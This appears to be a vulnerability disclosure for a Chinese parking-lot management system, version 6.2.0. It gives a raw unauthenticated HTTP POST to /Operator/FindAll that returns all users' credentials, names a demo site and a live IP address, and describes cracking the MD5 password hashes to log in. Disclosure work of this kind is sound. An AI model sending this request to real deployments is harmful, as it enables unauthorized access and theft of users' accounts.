[PRODUCT] 

 停车场管理系统   6.2.0

<img width="2151" height="977" alt="图片" src="https://github.com/user-attachments/assets/4a24daf9-013c-441e-93eb-436d4bbb361b" />




官网demo站：https://pms.demo.dasiot.cn/#/login

[TYPE] 

Sensitive Data Exposure

[DESCRIPTION] 

A Sensitive Data Exposure  vulnerability exists in the " 停车场管理系统 ".The system's API  is vulnerable to unauthorized access ,allowing unauthenticated users to exploit certain interfaces and retrieve  sensitive user data  posing a critical security risk. 

[DETAILS] 

Request package is as follows

```
PPOST /Operator/FindAll HTTP/1.1
Host: 
Content-Length: 4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: http://58.51.255.164:8011
Referer: http://58.51.255.164:8011/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

[]
```
<img width="2215" height="1233" alt="图片" src="https://github.com/user-attachments/assets/6ddf54d0-4645-47c8-9835-f713f04fd35e" />

Unauthorized access allows obtaining all users' account credentials, which can be decrypted and used for direct login.
MD5 decryption
<img width="2131" height="1011" alt="图片" src="https://github.com/user-attachments/assets/123e6523-44bf-4a58-89bc-48e00a1a13e8" />







